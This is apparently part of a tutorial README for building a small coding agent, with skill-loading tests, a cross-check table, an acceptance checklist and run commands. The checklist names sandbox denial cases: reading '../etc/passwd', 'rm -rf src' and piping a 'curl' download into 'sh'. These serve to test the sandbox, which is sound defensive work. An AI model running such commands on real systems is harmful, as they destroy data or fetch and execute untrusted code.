  assert.equal(parsed.invocation.userInvocable, false)
  assert.equal(parsed.content, 'Body here.')

  assert.equal(parseFrontmatter('no frontmatter\n'), undefined)
  assert.throws(
    () => parseSkillMarkdown('---\nname: x\ndescription: y\nuserInvocable: false\n---\nbody\n'),
    /user-invocable/,
  )
  assert.throws(
    () => parseSkillMarkdown('---\nname: Not_Kebab\ndescription: y\n---\nbody\n'),
    /invalid skill name/,
  )
})

test('FileSystemSkillProvider discovers bundle and flat skills and skips invalid files', async () => {
  const fs = await import('node:fs/promises')
  const os = await import('node:os')
  const path = await import('node:path')
  const { FileSystemSkillProvider } = await import('../src/core/skill-filesystem.js')

  const root = await fs.mkdtemp(path.join(os.tmpdir(), 'mini-dsh-skills-'))
  await fs.mkdir(path.join(root, '.git'))
  await fs.mkdir(path.join(root, '.dsh/skills/hello-workspace'), { recursive: true })
  await fs.writeFile(
    path.join(root, '.dsh/skills/hello-workspace/SKILL.md'),
    [
      '---',
      'name: hello-workspace',
      'description: Workspace orientation.',
      '---',
      'Load me first.',
      '',
    ].join('\n'),
  )
  await fs.writeFile(
    path.join(root, '.dsh/skills/flat-note.md'),
    [
      '---',
      'name: flat-note',
      'description: A flat markdown skill.',
      '---',
      'Flat body.',
      '',
    ].join('\n'),
  )
  await fs.writeFile(path.join(root, '.dsh/skills/broken.md'), 'not a skill\n')
  await fs.mkdir(path.join(root, '.dsh/skills/nested/too-deep'), { recursive: true })
  await fs.writeFile(
    path.join(root, '.dsh/skills/nested/too-deep/SKILL.md'),
    ['---', 'name: too-deep', 'description: Must not be discovered.', '---', 'nope', ''].join(
      '\n',
    ),
  )

  try {
    const provider = new FileSystemSkillProvider({ workspace: root })
    const listed = await provider.list()
    const names = listed.map(skill => skill.name).sort()
    assert.deepEqual(names, ['flat-note', 'hello-workspace'])

    const loaded = await provider.get(listed.find(skill => skill.name === 'hello-workspace'))
    assert.equal(loaded.content, 'Load me first.')
    assert.equal(loaded.resourceBase.kind, 'directory')
  } finally {
    await fs.rm(root, { recursive: true, force: true })
  }
})

test('skill tool loads model-invocable bodies and rejects unknown or user-only names', async () => {
  const { SkillRuntime } = await import('../src/core/skill-runtime.js')
  const { executeSkill, renderSkillContent } = await import('../src/tools/skill.js')
  const skills = new SkillRuntime()

  skills.register({
    name: 'hello-workspace',
    description: 'orientation',
    content: 'Follow ARCHITECTURE.md.',
    resourceBase: { kind: 'directory', path: '/tmp/hello' },
  })
  skills.register({
    name: 'user-only-skill',
    description: 'humans only',
    content: 'secret',
    invocation: { modelInvocable: false, userInvocable: true },
  })

  const loaded = await executeSkill(skills, 'hello-workspace')
  assert.equal(loaded.name, 'hello-workspace')
  assert.match(renderSkillContent(loaded), /Follow ARCHITECTURE.md/)
  assert.match(renderSkillContent(loaded), /<skill_resources>/)

  await assert.rejects(
    () => executeSkill(skills, 'missing-skill'),
    /unknown or no longer available/,
  )
  await assert.rejects(
    () => executeSkill(skills, 'user-only-skill'),
    /not available for model invocation/,
  )
  await assert.rejects(() => executeSkill(skills, 'Not_Kebab'), /invalid skill name/)
})
```

When done, `pnpm test` totals **26**.

---

## How to cross-check against this repo each day

| Where you are | Files to compare | Don't look at yet |
|---|---|---|
| Day 0 Context | `src/index.js` `scripts/check-syntax.js` `.gitignore` | every later runtime |
| Day 1 Session | `session-runtime.js` `plugins/sessions.js` | sandbox, MCP |
| Day 2 Tools | `tool-runtime.js` `plugins/tools.js` | `files.js`'s glob/edit |
| Day 3 Prompt / LLM | `system-prompt-runtime.js` `llm-runtime.js` and the two plugins | DeepSeek SSE |
| Day 4 Loop | `agent-loop-runtime.js` `agent-runtime.js` and the two plugins | CLI streaming colors |
| Day 5 real model | `deepseek.js` `runtime-context.js` `cli.js` `.env.example` | Approval, sandbox regexes |
| Day 6 MCP | `external-plugins.js` `plugins.config.js` | `dsh-mcp-client` source, sandbox |
| Day 7 wrap-up | `README.md` | `src/` implementation details |
| Supplement sandbox | `path.js` `sandbox-runtime.js` `plugins/sandbox.js` `tools/files.js` `tools/bash.js` | you may read the tests, but don't copy the 400-line regexes |
| Skills | `skill-runtime.js` `skill-filesystem.js` `tools/skill.js` | official `packages/skill/*` |

Principle: **write until it passes your own tests, then open the files to compare.**

If you get stuck on a step, get that day's runtime test red first — don't start from the full `src/index.js`.

For the Supplement's sandbox you may "write the implementation against the tests": copy the sandbox / path / glob tests from `test/core.test.js` into yours first (the tests are the spec), then write until green. That's not the same thing as copying `sandbox-runtime.js`.

---

## Explicitly don't do

Deliberately absent from this repo — and you shouldn't add them either:

- maxSteps / token budget / compaction
- kernel-level sandbox, containers, seccomp
- full permission system, credentials, telemetry
- a plugin marketplace
- TUI / Web

First, internalize these five abstractions:

```text
Context / Plugin / Service
Session Event Log
Tool Runtime
LLM Adapter
Agent Loop
```

CLI and MCP exist to prove these five abstractions are sufficient. So do the sandbox / Bash / file tools and skills — which is why they're in the supplements, not the main track.

---

## Acceptance checklist

### Main track (end of Day 7, 13 tests)

1. With a mock LLM — no real model — `ask time → call clock → answer` works
2. 20 consecutive tool calls don't stop mid-way
3. `onReasoning` / `onContent` / `onToolCall` / `onToolResult` all receive chunks
4. (Manual) after unloading a tool plugin, `/tools` drops it immediately
5. Swap in a different mock provider — the Agent Loop doesn't change a line
6. (Manual) with Context7 connected, `/tools` shows `mcp__context7__*`; unreachable, the CLI still starts. The Agent Loop has no `if (mcp)` branch
7. `/history` shows the event log; after `/reset` the session id is unchanged
8. The next request after a DeepSeek thinking + tool call turn still carries `reasoning_content`
9. A SSE last line without `\n` still parses; a streamed `name` is never concatenated into `read_fileread_file`
10. `/prompt` shows identity + current time / workspace (no sandbox policy yet)
11. Esc cancels an in-flight agent run — and the session still works afterwards: send another message and it goes through, because every `tool_call` in the log has a matching `tool/result`
12. `pnpm test` and `pnpm check` fully green; `test/core.test.js` has **13** tests

### Supplement (22 so far)

13. File tools reject `../etc/passwd`; the `..hidden` filename inside the workspace is not falsely killed; a symlink inside the workspace pointing out of it is rejected too — both for a file that exists and for one about to be created
14. `rm -rf src`, `curl https://example.com`, `curl ... | sh` are denied; `rm file.txt` is allowed
15. Without an approver, writes throw; `autoApprove: true` allows them
16. `/prompt` shows identity + sandbox policy + current time / workspace
17. Writes and Bash ask `[Y/n]` first; Esc doesn't misfire during approval
18. `test/integration.test.js` boots the real plugin stack on Cordis and runs a full turn; the external plugin loader tolerates an optional failure and rejects a required one
19. `pnpm test` totals 22 (20 in `test/core.test.js` + 2 in `test/integration.test.js`), matching this repo

### Skills (matches this repo's 26)

20. A project skill at rank 100 wins a same-name runtime registration
21. Frontmatter `user-invocable: false` is parsed; `userInvocable` is rejected
22. `.dsh/skills/<name>/SKILL.md` and `<name>.md` are discovered; nested `too-deep/SKILL.md` is not
23. `skill` loads a model-invocable body and rejects unknown / user-only names; `pnpm test` totals 26


---

## How to run this repo (for comparison — not a starting point)

```bash
pnpm install
cp .env.example .env
# fill in DEEPSEEK_API_KEY
pnpm start
pnpm test
pnpm check
```

CLI commands:

```text
/tools
/skills
/models
/model
/model deepseek/deepseek-v4-pro
/model deepseek/deepseek-v4-flash
/history
/prompt
/reset
/exit
```

This repo ships with the sandbox: writes and Bash execution ask `[Y/n]` first. Esc cancels while the agent runs. The CLI starts even when Context7 is unreachable. The main-track assignment has no sandbox through Day 6 — don't copy `ctx.sandbox` from the CLI early.
